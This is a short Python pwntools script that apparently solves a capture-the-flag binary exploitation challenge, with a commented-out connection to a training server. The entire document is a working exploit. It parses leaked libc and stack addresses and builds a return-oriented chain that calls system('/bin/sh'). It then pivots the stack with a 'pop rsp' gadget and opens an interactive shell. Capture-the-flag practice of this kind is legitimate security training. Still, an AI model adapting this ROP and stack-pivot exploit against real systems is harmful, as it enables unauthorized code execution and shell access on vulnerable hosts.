from pwn import *

context.terminal = ["alacritty", "-e", "fish", "-c"]
context.arch = "amd64"

gdbscript = """
    continue
"""

io = gdb.debug(["./chall_patched"], gdbscript=gdbscript)
# io = remote("training.theromanxpl0.it", 42086)
libc = ELF("./libc.so.6")

leaks = io.recvline().decode().split("0x")

libc_base = int(leaks[1], 16)
stack = int(leaks[2], 16)
libc.address = libc_base - 0x28000

log.info(f"libc base: {hex(libc.address)}")
log.info(f"stack: {hex(stack)}")

poprdi = libc.address + 0x000000000002a3e5
binsh = libc.address + 0x1d8678
poprsp = libc.address + 0x0000000000035732

payload = p64(poprdi) # pop rdi ; ret
payload += p64(binsh)          # ptr to /bin/sh 
payload += p64(libc.sym.system)                  # system
payload +=  b"A" * (56 - len(payload))
payload += p64(poprsp) # pop rsp ; ret
payload += p64(stack)

io.sendline(payload)

io.interactive()


